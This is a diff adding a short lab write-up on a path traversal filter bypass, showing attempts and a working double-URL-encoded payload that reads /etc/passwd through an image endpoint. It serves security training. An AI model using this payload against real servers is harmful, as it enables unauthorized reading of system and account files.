@@ -1,0 +1,21 @@
+**Objective:** Read the `/etc/passwd` file, given that `../` sequences are removed after URL decoding.
+
+**Vulnerability:** Path Traversal. The server performs double URL decoding.
+
+**Steps taken:**
+1. Opened the lab.
+2. Tried `filename=../../../etc/passwd` — blocked.
+3. Tried `filename=..%2f..%2f..%2fetc%2fpasswd` — blocked.
+4. Tried `filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd` — worked.
+5. The response contained the contents of `/etc/passwd`.
+
+
+**Payload:**
+/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+
+**Why it worked:**
+- The server performs double URL decoding.
+- First decoding pass: `%252e` → `%2e`, `%252f` → `%2f`.
+- Second decoding pass: `%2e` → `.`, `%2f` → `/`.
+- The server receives `../../../etc/passwd` and reads the file.
